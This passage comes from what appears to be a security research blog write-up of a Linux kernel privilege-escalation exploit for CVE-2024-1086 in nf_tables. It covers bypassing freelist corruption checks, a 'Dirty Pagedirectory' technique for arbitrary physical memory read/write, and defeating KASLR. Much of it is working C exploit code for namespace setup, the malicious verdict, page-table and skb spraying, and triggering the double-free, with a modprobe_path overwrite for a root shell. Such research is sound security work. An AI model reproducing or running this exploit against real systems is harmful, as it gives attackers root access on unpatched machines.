}</code></pre><figcaption><p><span style="white-space: pre-wrap;">Codeblock 4.3.1.1: C code of an userland function to set the </span><code spellcheck="false" style="white-space: pre-wrap;"><span>ipfrag_time</span></code><span style="white-space: pre-wrap;"> variable.</span></p></figcaption></figure><h3 id="44-bypassing-kernelctf-skb-corruption-checks">4.4. Bypassing KernelCTF skb corruption checks</h3><p>The only mitigation I had to actively bypass in the KernelCTF mitigation instance were freelist corruption checks, specifically the one that checks if the freelist next ptr in an object being allocated is corrupted.</p><p>Unfortunately, the freelist next ptr overlaps with <code>skb-&gt;len</code> since <code>skbuff_head_cache-&gt;offset == 0x70</code>. This means that the next/previous freelist entry pointer is stored at <code>sk_buff+0x70</code>, which coincidentally overlaps with <code>skb-&gt;len</code>. Online sources told me <code>s-&gt;offset</code> is usually set to half the slab size by kernel developers to avoid OOB writes from being able to overwrite freelist pointers, which in the past led to easy privesc using OOB bugs.</p><p>After the 1st <code>skb</code> free, the <code>skb-&gt;len</code> field gets overwritten with a partial next ptr value. In the code leading up to <code>skb</code>&apos;s 2nd free, the <code>skb-&gt;len</code> field gets modified because of packet parsing. Hence, the freelist next ptr gets corrupted even before the 2nd <code>skb</code> free. </p><p>When we try to allocate the freelist entry of the 1st <code>skb</code> free (after said corruption) using <code>slab_alloc_node()</code>, the freelist next ptr in the freed object gets flagged for corruption in calls invoked by <code>freelist_ptr_decode()</code>:</p><figure class="kg-card kg-code-card"><pre><code class="language-c">static inline bool freelist_pointer_corrupted(struct slab *slab, freeptr_t ptr,
	void *decoded)
{
#ifdef CONFIG_SLAB_VIRTUAL
	/*
	 * If the freepointer decodes to 0, use 0 as the slab_base so that
	 * the check below always passes (0 &amp; slab-&gt;align_mask == 0).
	 */
	unsigned long slab_base = decoded ? (unsigned long)slab_to_virt(slab) : 0;

	/*
	 * This verifies that the SLUB freepointer does not point outside the
	 * slab. Since at that point we can basically do it for free, it also
	 * checks that the pointer alignment looks vaguely sane.
	 * However, we probably don&apos;t want the cost of a proper division here,
	 * so instead we just do a cheap check whether the bottom bits that are
	 * clear in the size are also clear in the pointer.
	 * So for kmalloc-32, it does a perfect alignment check, but for
	 * kmalloc-192, it just checks that the pointer is a multiple of 32.
	 * This should probably be reconsidered - is this a good tradeoff, or
	 * should that part be thrown out, or do we want a proper accurate
	 * alignment check (and can we make it work with acceptable performance
	 * cost compared to the security improvement - probably not)?
	 */
	return CHECK_DATA_CORRUPTION(
		((unsigned long)decoded &amp; slab-&gt;align_mask) != slab_base,
		&quot;bad freeptr (encoded %lx, ptr %p, base %lx, mask %lx&quot;,
		ptr.v, decoded, slab_base, slab-&gt;align_mask);
#else
	return false;
#endif
}</code></pre><figcaption><p><span style="white-space: pre-wrap;">Codeblock 4.4.1: C code of the kernel function </span><code spellcheck="false" style="white-space: pre-wrap;"><span>freelist_pointer_corrupted()</span></code><span style="white-space: pre-wrap;"> (KernelCTF mitigation instance), including the original comments. </span></p></figcaption></figure><p>After some research, I figured out that this check is not ran retroactively: when we free an object on top of the object with a corrupted freelist entry, the mitigation does not check if the previous object has a corrupted next ptr. This means that we can mask an invalid next ptr by freeing another skb after it, and then allocate that skb again with the data of the old skb. This basically masks the original corrupted skb, whilst still being able to double-alloc the skb data.</p><p>The diagram below tries to explain this phenomenon by performing a double-free on an skb object like the exploit in this blogpost.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://pwning.tech/content/images/2024/02/bypass_freelist_corruption-2.svg" class="kg-image" alt loading="lazy" width="885" height="729"><figcaption><span style="white-space: pre-wrap;">Illustration 4.4.2: Sequence overview of bypassing the freelist corruption detection in the KernelCTF mitigation kernel.</span></figcaption></figure><p>The KernelCTF devs could mitigate this by checking the freelist head next ptr for corruption when freeing, not only when allocating.</p><h3 id="45-dirty-pagedirectory">4.5. Dirty Pagedirectory</h3><h4 id="451-the-train-of-thought">4.5.1. The train of thought</h4><p>Dirty Pagetable is one of the most interesting techniques I have encountered so far. When I was researching ready-made techniques to exploit the double-free bug Dirty Pagetable came to surface, and it seemed like a perfect technique.</p><p>However I did realize that consistent writing to the PTE page would be an unpleasant experience in the context of my double-free bug. I was unable to find any page-sized objects which allowed to be fully overwritable with userdata, whilst also being in the same page freelist as the PTE pages. I did not want to use cross-cache attacks for stability and compatiblity related reasons, as this would introduce more complexity into the exploit.</p><p>Next came a night full of brainstorming which gave me the following idea: considering I have a double-free in the same freelist as PTEs - what if it were possible to double allocate PTEs across processes, such as sudo and the exploit. This would essentially perform memory sharing (pointing the exploit virtual addresses to sudo&apos;s physical addresses) between the two completely unrelated processes. Hence, it would presumably be possible to manipulate the application data of an process running under root, and leverage that for a root shell. This turned out to be a bit unpractical considering there were other allocations happening as a process gets started, so there would need to be very good position management on the freelist.</p><p>This gave me the next idea: what if it were possible to double-allocate an exploit PTE page and an exploit PMD page, as this would mean that the PMD would dereference the PTE&apos;s page (as PTE value) as PTE and hence resolve the PTE&apos;s userland pages as PTE.</p><p>Fortunately enough, this PMD+PTE approach works. Alternatives such as PUD+PMD have been confirmed working as well, and perhaps PGD+PUD works too. The only difference is the amount of pages simulationously mirrored: 1GiB pages with PTE+PMD, 512GiB with PUD+PMD, and presumably 256TiB with PGD+PUD (if this is even possible). Keep in mind that this has impact on memory usage, and the system may go OOM with too much memory mirrored. </p><p>Additionally, the integration of Dirty Pagedirectory needs to be considered when choosing between PMD+PTE and PUD+PMD. I explain this in the PTE spraying section, but in general PMD+PTE should be the best choice.</p><h4 id="452-the-technique">4.5.2. The technique</h4><p>The Dirty Pagedirectory technique allows unlimited, stable read/write to any memory page based on physical addresses. It can bypass permissions by setting its own permission flags. This allows our exploit to write to read-only pages like those containing <code>modprobe_path</code>.</p><blockquote><strong>In this section I explain PUD+PMD, but it boils down to the same as the PMD+PTE strategy from the PoC exploit.</strong></blockquote><p>The technique is quite simplistic in nature: allocate a Page Upper Directory (PUD) and Page Middle Directory (PMD) to the same kernel address using a bug like a double-free. The VMAs should be seperate, to avoid conflicts (a.k.a. do not allocate the PMD within the area of the PUD). Then, write an address to the page in the PMD range and read the address in the corresponding page of the PUD range. The diagram below tries to explain this phenomenon (complementary to the example under it).</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://pwning.tech/content/images/2024/03/dirtypagedirectory.svg" class="kg-image" alt loading="lazy" width="891" height="626"><figcaption><span style="white-space: pre-wrap;">Illustration 4.5.2.1: Hierachy overview of the Dirty Pagedirectory technique, including required memory operations.</span></figcaption></figure><p>To make things more hands-on, let&apos;s imagine the following scenario: the infamous <code>modprobe_path</code> variable is stored in a page at PFN/physical address <code>0xCAFE1460</code>. We apply Dirty Pagedirectory: double-allocate the PUD page and PMD page via mmap for respective userland VMA ranges <code>0x8000000000 - 0x10000000000</code> (<code>mm-&gt;pgd[1]</code>) and <code>0x40000000 - 0x80000000</code> (<code>mm-&gt;pgd[0][1]</code>).</p><p>This automatically means that <code>mm-&gt;pgd[1][x][y]</code> is always equal to <code>mm-&gt;pgd[0][1][x][y]</code> because both <code>mm-&gt;pgd[1]</code> and <code>mm-&gt;pgd[0][1]</code> refer to the address/object as we double-allocated them. Observe how <code>mm-&gt;pgd[0][1][x][y]</code> is a userland page, and that <code>mm-&gt;pgd[1][x][y]</code> is a PTE. This means that the dedicated PUD area will interpret a userland page from the PMD area like a PTE.</p><p>Now, to read the physical page address <code>0xCAFE1460</code> we set first entry of the PUD areas&apos; PTE value to <code>0x80000000CAFE1867</code> (added PTE flags) by writing that value to <code>0x40000000</code> (a.k.a. userland address for page @ <code>mm-&gt;pgd[0][1][0][0]+0x0</code>). Because of the entanglement rule above, this means that we wrote that value to the PTE address for page @ <code>mm-&gt;pgd[1][0][0]+0x0</code>, since <code>mm-&gt;pgd[1][0][0] == mm-&gt;pgd[0][1][0][0]</code>. Now, we can dereference that malicious PTE value by reading page <code>mm-&gt;pgd[1][0][0][0]</code> (last index 0 since we wrote it to the first 8 bytes of the PTE: notice <code>0x0</code> above). This is equal to userland page <code>0x8000000000</code>.</p><p>Because the PTE is now changed from userland, we need to flush the TLB because the TLB will contain outdated record. Once that&apos;s done, <code>printf(&apos;%s&apos;, 0x8000000460);</code> should print <code>/sbin/modprobe</code> or whatever value <code>modprobe_path</code> is. Naturally, we can now overwrite <code>modprobe_path</code> by doing <code>strcpy((char*)0x8000000460, &quot;/tmp/privesc.sh&quot;);</code>  (there&apos;s <code>KMOD_PATH_LEN</code> bytes padding) and drop a root shell. This does not require TLB flushing because the PTEs themselves have not changed when writing to the address.</p><blockquote>Observe how we set the read/write flags in PTE value <code>0x80000000CAFE1867</code>. Note that <code>0x8</code> in virtual address <code>0x8000000460</code> and PTE value<code>0x80000000CAFE1867</code> has nothing to do with each other: in the PTE value it is a flag turned on, and the virtual address just happens to start with <code>0x8</code>. </blockquote><p>This boils down to: write PTE values to userland pages in the VMA range of <code>0x40000000 - 0x80000000</code>, and dereference them by reading and writing corresponding userland pages in the VMA range of <code>0x8000000000 - 0x10000000000</code>.</p><h4 id="453-the-mitigations">4.5.3. The mitigations</h4><p>I have used this technique to bypass a lot of mitigations currently in the kernel (among others: virtual KASLR, KPTI, SMAP, SMEP, and <code>CONFIG_STATIC_USERMODEHELPER</code>), albeit other mitigations are bypassed in the PoC exploit with a little redneck engineering.</p><p>When this technique was peer-reviewed I got asked how it was able to bypass SMAP. The answer is quite simple: SMAP only works with virtual addresses and not for physical memory addresses. PTEs are referred to in PMDs by their physical address. This means that when a PTE entry in a PMD is a userland page, it will not be detected by SMAP because it is not a virtual addresses. Hence, the PUD area can happily use the userland page as a PTE without SMAP intereference.</p><p>It would be possible to mitigate this technique by setting an table entries&apos; type in the entry and use it to detect when a PMD is allocated on the place of an PUD since we cannot forge PMD entries and PUD entries themselves. An example is setting type 0 for PTEs, 1 for PMDs, 2 for PUDs, 3 for P4Ds, 4 for PGDs, et cetera. However, this would require <code>2log(levels)</code> bits to be set in each table entry (3 bits when P4D is enabled, since levels=5) which would sacrifice space intended for features in the future, as well as the runtime checks presumably introducing a great deal of overhead since each level for each memory access has to be checked. Additionally, this mitigation would still allow for forced memory sharing (i.e. overlapping an exploit PTE page with an PTE page of sudo, running as root). </p><h3 id="46-spraying-pagetables-for-dirty-pd">4.6. Spraying pagetables for Dirty PD</h3><p>You may notice that that the Dirty Pagedirectory section above mentions PUD+PMD, but the proof-of-concept uses PMD+PTE. This is related to the fact that the exploit drains the PCP list to allocate a PTE in the double-free&apos;d address. </p><p>First off, pagetables are allocated by the kernel on demand, so if we mmap&apos;d a virtual memory area the allocation does not happen. Only when we actually read/write this VMA it will allocate the required pagetables for the accessed page. When allocating a PUD for instance, the PMD, PTE, and userland page will be allocated. When allocating a PTE, the target userland page will also be allocated.</p><p>The original Dirty Pagetable paper mentions that - very elegantly - you can spray specific pagetable levels by allocating the parents first, since a parent (i.e. PMD) contains 512 children (PTEs). Hence, if we wanted to spray 4096 PTEs, we would need to pre-allocate 8 (<code>4096/512 = 8</code>) PMDs, before allocating the PTEs.</p><p>If we spray PMDs, the PTEs will be allocated as well - from the same freelist. This means that 50% of the spray is PMD, and 50% is PTE. If we would spray PUDs, it would be 33% PUD, 33% PMD, and 33% PTE. Hence, if we spray PTEs, it will be 100% PTE since we are not doing any other allocations. Because of this, we use PMD+PTE in the exploit and not PUD+PMD, and spraying PMDs means 50% less stability.</p><blockquote>Note that userland pages themselves are allocated from a different freelist (migratetype 0, not migratetype 1). </blockquote><h3 id="47-tlb-flushing">4.7. TLB Flushing</h3><p>TLB flushing is the practice of removing or invalidating all entries in the translation lookaside buffer (virtual address to physical address caching). In order to scan addresses reliably using the Dirty Pagedirectory technique, we need to come up with a TLB flushing technique that satisfies the following requirements:</p><ul><li><strong>Does not modify existing process pagetables</strong></li><li><strong>Has to work 100% of the time</strong></li><li>Has to be quick</li><li>Can be triggered from userland</li><li>Has to work regardless of PCID</li></ul><p>Based upon these requirements I came up with the following idea: when allocating PMD and PTE memory areas you should mark them as shared, and then fork() the process, make the child munmap() it for a flush, and make the child go to sleep (to avoid crashes if the underlying exploit is unstable). The result is the following function:</p><figure class="kg-card kg-code-card"><pre><code class="language-c">static void flush_tlb(void *addr, size_t len)
{
	short *status;

	status = mmap(NULL, sizeof(short), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	
	*status = FLUSH_STAT_INPROGRESS;
	if (fork() == 0)
	{
		munmap(addr, len);
		*status = FLUSH_STAT_DONE;
		PRINTF_VERBOSE(&quot;[*] flush tlb thread gonna sleep\n&quot;);
		sleep(9999);
	}

	SPINLOCK(*status == FLUSH_STAT_INPROGRESS);

	munmap(status, sizeof(short));
}</code></pre><figcaption><p><span style="white-space: pre-wrap;">Codeblock 4.7.1: C code of an userland function which flushes the TLB for a certain virtual memory range.</span></p></figcaption></figure><p>The locking mechanism prevents the parent from continuing execution before the child has flushed the TLB. It could presumably be removed if the child performs a process exit instead of sleeping, as the parent could monitor for the childs process state.</p><p>This TLB flushing method has worked 100% of the times to refresh pagetables and pagedirectories. It has been tested on a recent AMD CPU and in QEMU VMs. It should be hardware independent, since the flush HAS to be triggered from the kernel in this usecase. </p><h3 id="48-dealing-with-physical-kaslr">4.8. Dealing with physical KASLR</h3><p>Physical Kernel Address Space Layout Randomization (Physical KASLR) is the practice of randomizing the physical base address of the Linux kernel. Usually, this is not important since nearly all exploits work with virtual memory (and therefore have to deal with virtual KASLR). </p><p>However, because of the nature of our exploit - which utilizes Dirty Pagedirectory - we need to have the physical address of the memory we want to read/write to. </p><h4 id="481-getting-the-physical-kernel-base-address">4.8.1. Getting the physical kernel base address</h4><p>Usually, this means we would need to bruteforce the entire physical memory range to find the physical target address. </p><blockquote>Physical memory refers to all forms usable of physical memory addresses: e.g. on a laptop 16GiB RAM stick + 1GiB builtin MMIO = 17GiB physical memory on the device.</blockquote><p>However, one of the quirks of the Linux kernel is that the physical kernel base address has to be aligned to <code>CONFIG_PHYSICAL_START</code> (i.e. <code>0x100&apos;0000</code> a.k.a. 16MiB) bytes if <code>CONFIG_RELOCATABLE=y</code>. If <code>CONFIG_RELOCATABLE=n</code>, the physical kernel base address will be exactly at <code>CONFIG_PHYSICAL_START</code>. For this technique, we assume <code>CONFIG_RELOCATABLE=y</code>, since it would not make sense to bruteforce physical KASLR if we knew the address.</p><blockquote>If <code>CONFIG_PHYSICAL_ALIGN</code> is set, this value will be used for the alignment instead of <code>CONFIG_PHYSICAL_START</code>. Note that <code>CONFIG_PHYSICAL_ALIGN</code> is usually smaller, like <code>0x20&apos;0000</code> a.k.a. 2MiB, which means more addresses need to be bruteforced (8 times more than with an alignment of <code>0x100&apos;0000</code>). </blockquote><p>Assuming the target device has 8GiB physical memory, this means that we can reduce our search area to <code>8GiB / 16MiB = 512</code> possible physical kernel base addresses since we know the base address has to be aligned to <code>CONFIG_PHYSICAL_START</code> bytes. The advantage is that we only have to check the first few bytes of the first page of the 512 addresses to check if that page is the kernel base. </p><p>We can essentially figure out the physical kernel base address by bruteforcing a few hundred physical addresses. Fortunately, Dirty Pagedirectory allows for unlimited read/writes of entire pages, and hence allows us to read 4096 bytes per physical (page) address, and even more fortunately 512 page addresses per PTE overwrite. This requires us to only overwrite the PTE once to figure out the physical kernel base address if our machine has 8GiB memory.</p><p>In order to properly recognize which of those 512 physical addresses contains the kernel base, I have written <a href="https://github.com/Notselwyn/get-sig" rel="noreferrer">get-sig</a>: a few Python scripts to generate a giant memcmp-powered if statement which finds overlapping bytes between different kernel dumps.</p><h4 id="482-getting-the-physical-target-address">4.8.2. Getting the physical target address</h4><p>When we find the physical base address, we can find the final target address of our read/write operation - if it resides within the kernel area - using hardcoded offsets based on the physical kernel base, or by scanning the <code>~80MiB</code> physical kernel memory area for data patterns of the target. </p><p>The data scanning technique requires <code>1 + 80MiB/2MiB ~= 40</code> PTE overwrites on a system with 8GiB memory. If we have access to Dirty Pagedirectory and the format of the target data is unique (like <code>modprobe_path</code>&apos;s buffer), the data pattern scanning method is better due to broader compatibility across kernel versions, and especially if we do not know the offsets when compiling the exploit.</p><p>Please note <code>~80MiB</code> for the memory scanning technique is an estimation and will probably be less in reality, and it can even be optimized to a smaller memory area because certain targets may reside at certain areas which have a certain offset. For example, kernel code may appear from offset <code>+0x0</code> from the base address, whilst kernel data may always start from e.g. <code>+0x1000000</code> regardless of the kernel used because the kernel size remains pretty consistent. Hence, if we were searching for <code>modprobe_path</code>, we could simply start at <code>+0x1000000</code>, but this has not been tested.</p><h2 id="5-proof-of-concept">5. Proof of Concept</h2><h3 id="51-execution">5.1. Execution</h3><p>Let&apos;s breach the mainframe, shall we? The general outlines of the exploit can be derived from the diagram below. In this section I&apos;m trying to link the subsections to this diagram for clarity. </p><blockquote>Note that the exploit in this section refers to the new version, not the original KernelCTF mitigation exploit (the new one works on the mitigation instance as well). That write-up will be published seperately in the KernelCTF repository.</blockquote><p>Feel free to read along with the source code of the exploit, which is available in my <a href="https://github.com/Notselwyn/CVE-2024-1086" rel="noreferrer">CVE-2024-1086 PoC repository</a>.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://pwning.tech/content/images/2024/03/-gameplanv2-5.svg" class="kg-image" alt loading="lazy" width="803" height="1630"><figcaption><span style="white-space: pre-wrap;">Illustration 5.1.1: An birdseye execution overview of the exploit stages.</span></figcaption></figure><h4 id="511-setting-up-the-environment">5.1.1. Setting up the environment</h4><p>To trigger the bug we need to set up a certain network environment and usernamespaces.</p><h5 id="5111-namespaces">5.1.1.1. Namespaces</h5><p>For the LPE exploit, we need the unprivileged-user namespaces option set to access nf_tables. This should be enabled by default on major distro&apos;s like Debian and Ubuntu. As such, those distrobutions have a bigger attack surface than distro&apos;s which do not allow unprivileged usernamespaces. This can be checked using <code>sysctl kernel.unprivileged_userns_clone</code>, and <code>1</code> means it is enabled:</p><figure class="kg-card kg-code-card"><pre><code class="language-bash">$ sysctl kernel.unprivileged_userns_clone
kernel.unprivileged_userns_clone = 1</code></pre><figcaption><p><span style="white-space: pre-wrap;">Codeblock 5.1.1.1.1: The CLI command for checking if unprivileged user namespaces are enabled.</span></p></figcaption></figure><p>We create the required user and network namespaces in the exploit using:</p><figure class="kg-card kg-code-card"><pre><code class="language-c">static void do_unshare()
{
    int retv;

    printf(&quot;[*] creating user namespace (CLONE_NEWUSER)...\n&quot;);
    
	// do unshare seperately to make debugging easier
    retv = unshare(CLONE_NEWUSER);
	if (retv == -1) {
        perror(&quot;unshare(CLONE_NEWUSER)&quot;);
        exit(EXIT_FAILURE);
    }

    printf(&quot;[*] creating network namespace (CLONE_NEWNET)...\n&quot;);

    retv = unshare(CLONE_NEWNET);
    if (retv == -1)
	{
		perror(&quot;unshare(CLONE_NEWNET)&quot;);
		exit(EXIT_FAILURE);
	}
}</code></pre><figcaption><p><span style="white-space: pre-wrap;">Codeblock 5.1.1.1.2: The </span><code spellcheck="false" style="white-space: pre-wrap;"><span>do_unshare()</span></code><span style="white-space: pre-wrap;"> exploit function written in C, which creates the user and network namespaces.</span></p></figcaption></figure><p>Afterwards, we give ourselves namespace root access by setting UID/GID mappings using:</p><figure class="kg-card kg-code-card"><pre><code class="language-c">static void configure_uid_map(uid_t old_uid, gid_t old_gid)
{
    char uid_map[128];
    char gid_map[128];

    printf(&quot;[*] setting up UID namespace...\n&quot;);
    
    sprintf(uid_map, &quot;0 %d 1\n&quot;, old_uid); 
    sprintf(gid_map, &quot;0 %d 1\n&quot;, old_gid);

    // write the uid/gid mappings. setgroups = &quot;deny&quot; to prevent permission error 
    PRINTF_VERBOSE(&quot;[*] mapping uid %d to namespace uid 0...\n&quot;, old_uid);
    write_file(&quot;/proc/self/uid_map&quot;, uid_map, strlen(uid_map), 0);

    PRINTF_VERBOSE(&quot;[*] denying namespace rights to set user groups...\n&quot;);
    write_file(&quot;/proc/self/setgroups&quot;, &quot;deny&quot;, strlen(&quot;deny&quot;), 0);

    PRINTF_VERBOSE(&quot;[*] mapping gid %d to namespace gid 0...\n&quot;, old_gid);
	write_file(&quot;/proc/self/gid_map&quot;, gid_map, strlen(gid_map), 0);

#if CONFIG_VERBOSE_
    // perform sanity check
    // debug-only since it may be confusing for users
	system(&quot;id&quot;);
#endif
}</code></pre><figcaption><p><span style="white-space: pre-wrap;">Codeblock 5.1.1.1.3: The </span><code spellcheck="false" style="white-space: pre-wrap;"><span>configure_uid_map()</span></code><span style="white-space: pre-wrap;"> exploit function written in C, which sets up the user and group mappings.</span></p></figcaption></figure><h5 id="5112-nftables">5.1.1.2. Nftables</h5><p>In order to trigger the bug, we need to set up hooks/rules with the malicious verdict. I will not display the full code here to prevent clutter, so feel free to check the Github repo. However, I use the function below to set the precise verdict.</p><figure class="kg-card kg-code-card"><pre><code class="language-c">// set rule verdict to arbitrary value
static void add_set_verdict(struct nftnl_rule *r, uint32_t val)
{
	struct nftnl_expr *e;

	e = nftnl_expr_alloc(&quot;immediate&quot;);
	if (e == NULL) {
		perror(&quot;expr immediate&quot;);
		exit(EXIT_FAILURE);
	}

	nftnl_expr_set_u32(e, NFTNL_EXPR_IMM_DREG, NFT_REG_VERDICT);
	nftnl_expr_set_u32(e, NFTNL_EXPR_IMM_VERDICT, val);

	nftnl_rule_add_expr(r, e);
}
</code></pre><figcaption><p><span style="white-space: pre-wrap;">Codeblock 5.1.1.2.1: The </span><code spellcheck="false" style="white-space: pre-wrap;"><span>add_set_verdict()</span></code><span style="white-space: pre-wrap;"> exploit function written in C, which registers the malicious Netfilter verdict causing the bug.</span></p></figcaption></figure><h5 id="5113-pre-allocations">5.1.1.3. Pre-allocations</h5><p>Before we start the actual exploitation part of the program, we need to pre-allocate some objects to prevent allocator noise, since there may be sensitive areas in the exploit where it may fail if there is too much noise in the background. This is not rocketscience, and more of a chore than technical magic.</p><p>Note the <code>CONFIG_SEC_BEFORE_STORM</code> which waits for all allocations in the background to finish, in case some allocations are happening across CPUs. This considerably slows down the exploit (1 second -&gt; 11 seconds), but it definitively increases exploit stability on systems where there may be a lot of background noise. Ironically enough, the success rate increased 93% -&gt; 99,4% (n=1000) <strong>without</strong> the sleep, on systems with barely any workload (like the kernelctf image), so play around with this value as you like.</p><figure class="kg-card kg-code-card"><pre><code class="language-c">static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
{
	unsigned long long *pte_area;
	void *_pmd_area;
	void *pmd_kernel_area;
	void *pmd_data_area;
	struct ip df_ip_header = {
		.ip_v = 4,
		.ip_hl = 5,
		.ip_tos = 0,
		.ip_len = 0xDEAD,
		.ip_id = 0xDEAD, 
		.ip_off = 0xDEAD,
		.ip_ttl = 128,
		.ip_p = 70,
		.ip_src.s_addr = inet_addr(&quot;1.1.1.1&quot;),
		.ip_dst.s_addr = inet_addr(&quot;255.255.255.255&quot;),
	};
	char modprobe_path[KMOD_PATH_LEN] = { &apos;\x00&apos; };

	get_modprobe_path(modprobe_path, KMOD_PATH_LEN);

	printf(&quot;[+] running normal privesc\n&quot;);

    PRINTF_VERBOSE(&quot;[*] doing first useless allocs to setup caching and stuff...\n&quot;);

	pin_cpu(0);

	// allocate PUD (and a PMD+PTE) for PMD
	mmap((void*)PTI_TO_VIRT(1, 0, 0, 0, 0), 0x2000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	*(unsigned long long*)PTI_TO_VIRT(1, 0, 0, 0, 0) = 0xDEADBEEF;

	// pre-register sprayed PTEs, with 0x1000 * 2, so 2 PTEs fit inside when overlapping with PMD
	// needs to be minimal since VMA registration costs memory
	for (unsigned long long i=0; i &lt; CONFIG_PTE_SPRAY_AMOUNT; i++)
	{
		void *retv = mmap((void*)PTI_TO_VIRT(2, 0, i, 0, 0), 0x2000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);

		if (retv == MAP_FAILED)
		{
			perror(&quot;mmap&quot;);
			exit(EXIT_FAILURE);
		}
	}

	// pre-allocate PMDs for sprayed PTEs
	// PTE_SPRAY_AMOUNT / 512 = PMD_SPRAY_AMOUNT: PMD contains 512 PTE children
	for (unsigned long long i=0; i &lt; CONFIG_PTE_SPRAY_AMOUNT / 512; i++)
		*(char*)PTI_TO_VIRT(2, i, 0, 0, 0) = 0x41;
	
	// these use different PTEs but the same PMD
	_pmd_area = mmap((void*)PTI_TO_VIRT(1, 1, 0, 0, 0), 0x400000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	pmd_kernel_area = _pmd_area;
	pmd_data_area = _pmd_area + 0x200000;

	PRINTF_VERBOSE(&quot;[*] allocated VMAs for process:\n  - pte_area: ?\n  - _pmd_area: %p\n  - modprobe_path: &apos;%s&apos; @ %p\n&quot;, _pmd_area, modprobe_path, modprobe_path);

	populate_sockets();

	set_ipfrag_time(1);

	// cause socket/networking-related objects to be allocated
	df_ip_header.ip_id = 0x1336;
	df_ip_header.ip_len = sizeof(struct ip)*2 + 32768 + 8 + 4000;
	df_ip_header.ip_off = ntohs((8 &gt;&gt; 3) | 0x2000);
	alloc_intermed_buf_hdr(32768 + 8, &amp;df_ip_header);

	set_ipfrag_time(9999);

	printf(&quot;[*] waiting for the calm before the storm...\n&quot;);
	sleep(CONFIG_SEC_BEFORE_STORM);

    // ... (rest of the exploit)
}
</code></pre><figcaption><p><span style="white-space: pre-wrap;">Codeblock 5.1.1.3.1: Partial code for the exploit written in C, which pre-allocates objects to reduce noise on the kernel page allocators.</span></p></figcaption></figure><h4 id="512-performing-double-free">5.1.2. Performing double-free</h4><p>Performing the double-free is the most tricky part of the exploit as we need to play with IPv4 networking code and the page allocators. In this section we will perform it so we can obtain arbitrary, unlimited r/w to any physical memory page with Dirty Pagedirectory in the next section, which is ironically enough a lot easier. </p><h5 id="5121-reserving-clean-skbs-for-masking">5.1.2.1. Reserving clean skb&apos;s for masking</h5><p>In order to allocate skb&apos;s before the double-free (which we free in between the double-free to avoid detection and for stability), the exploit sends UDP packets to its own UDP listener socket. Until the UDP listener recv()&apos;s the packets, they will remain in memory as seperate skb&apos;s.</p><figure class="kg-card kg-code-card"><pre><code class="language-c">void send_ipv4_udp(const char* buf, size_t buflen)
{
    struct sockaddr_in dst_addr = {
		.sin_family = AF_INET,
        .sin_port = htons(45173),
		.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;)
	};

	sendto_noconn(&amp;dst_addr, buf, buflen, sendto_ipv4_udp_client_sockfd);
}</code></pre><figcaption><p><span style="white-space: pre-wrap;">Codeblock 5.1.2.1.1: The </span><code spellcheck="false" style="white-space: pre-wrap;"><span>send_ipv4_udp()</span></code><span style="white-space: pre-wrap;"> exploit function written in C, which abstracts away networking data.</span></p></figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-c">static void alloc_ipv4_udp(size_t content_size)
{
	PRINTF_VERBOSE(&quot;[*] sending udp packet...\n&quot;);
	memset(intermed_buf, &apos;\x00&apos;, content_size);
	send_ipv4_udp(intermed_buf, content_size);
}

static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
{
    // ... (setup code)

    // pop N skbs from skb freelist
	for (int i=0; i &lt; CONFIG_SKB_SPRAY_AMOUNT; i++)
	{
		PRINTF_VERBOSE(&quot;[*] reserving udp packets... (%d/%d)\n&quot;, i, CONFIG_SKB_SPRAY_AMOUNT);
		alloc_ipv4_udp(1);
	}

    // ... (rest of the exploit)
}</code></pre><figcaption><p><span style="white-space: pre-wrap;">Codeblock 5.1.2.1.2: Partial code for the exploit written in C, which allocated UDP packets to spray sk_buff objects, for free-usage later.</span></p></figcaption></figure><h5 id="5122-triggering-double-free-1st-free">5.1.2.2. Triggering double-free 1st free</h5><p>In order to trigger the double-free I send an IP packet which triggers the nftables rule we set up earlier. It is an arbitrary protocol excluding TCP and UDP, because they would get passed on to the TCP/UDP handler code which would panic the kernel due to data corruption. </p><p>Note the usage of the <code>IP_MF</code> flag (<code>0x2000</code>) in the offset field of IP header, which we use to force the skb into an IP fragment queue, and free the skb at will later by sending the &quot;completing&quot; fragment. Also note that the size of this skb determines the double-free size. If we allocate a packet with 0 bytes content, the allocated skb head object will be in kmalloc-256 (because of metadata), but if we allocate an packet with 32768 bytes, it will be order 4 (16-page from the buddy-allocator). </p><figure class="kg-card kg-code-card"><pre><code class="language-c">static char intermed_buf[1 &lt;&lt; 19]; // simply pre-allocate intermediate buffers

static int sendto_ipv4_ip_sockfd;

void send_ipv4_ip_hdr(const char* buf, size_t buflen, struct ip *ip_header)
{
	size_t ip_buflen = sizeof(struct ip) + buflen;
    struct sockaddr_in dst_addr = {
		.sin_family = AF_INET,
		.sin_addr.s_addr =  inet_addr(&quot;127.0.0.2&quot;)  // 127.0.0.1 will not be ipfrag_time&apos;d. this can&apos;t be set to 1.1.1.1 since C runtime will prob catch it
	};

    memcpy(intermed_buf, ip_header, sizeof(*ip_header));
	memcpy(&amp;intermed_buf[sizeof(*ip_header)], buf, buflen);

	// checksum needds to be 0 before
	((struct ip*)intermed_buf)-&gt;ip_sum = 0;
	((struct ip*)intermed_buf)-&gt;ip_sum = ip_finish_sum(ip_checksum(intermed_buf, ip_buflen, 0));

	PRINTF_VERBOSE(&quot;[*] sending IP packet (%ld bytes)...\n&quot;, ip_buflen);

	sendto_noconn(&amp;dst_addr, intermed_buf, ip_buflen, sendto_ipv4_ip_sockfd);
